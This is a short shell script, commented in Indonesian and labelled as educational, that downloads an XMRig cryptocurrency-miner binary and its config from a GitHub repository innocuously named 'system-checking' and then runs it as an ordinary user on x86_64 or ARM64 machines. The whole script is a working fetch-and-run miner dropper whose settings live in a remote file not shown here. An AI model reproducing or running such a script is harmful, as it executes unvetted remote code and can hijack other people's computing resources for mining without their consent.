#!/bin/sh
# XMRig Edukasi - Runner untuk VM x86_64 dan ARM64
# Dijalankan sebagai user biasa, tanpa root.

set -e

REPO_USER="Loritcz"
REPO_NAME="system-checking"
BRANCH="main"

ARCH=$(uname -m)
case "$ARCH" in
    x86_64|amd64)
        BIN="xmrig-x86_64"
        ;;
    aarch64|arm64)
        BIN="xmrig-aarch64"
        ;;
    *)
        echo "Arsitektur tidak didukung: $ARCH"
        exit 1
        ;;
esac

WORKDIR="$HOME/xmrig-edu"
mkdir -p "$WORKDIR"
cd "$WORKDIR"

RAW_URL="https://raw.githubusercontent.com/${REPO_USER}/${REPO_NAME}/${BRANCH}"

# Download config.json jika belum ada
if [ ! -f config.json ]; then
    echo "[+] Download config.json..."
    curl -fsSL -o config.json "${RAW_URL}/config.json"
fi

# Download binary sesuai arsitektur jika belum ada
if [ ! -f "$BIN" ]; then
    echo "[+] Download binary $BIN untuk arsitektur $ARCH..."
    curl -fsSL -o "$BIN" "${RAW_URL}/${BIN}"
    chmod +x "$BIN"
fi

# Pastikan binary executable
chmod +x "$BIN"

echo "[+] Menjalankan XMRig dengan binary: $BIN"
./"$BIN" -c config.json "$@"
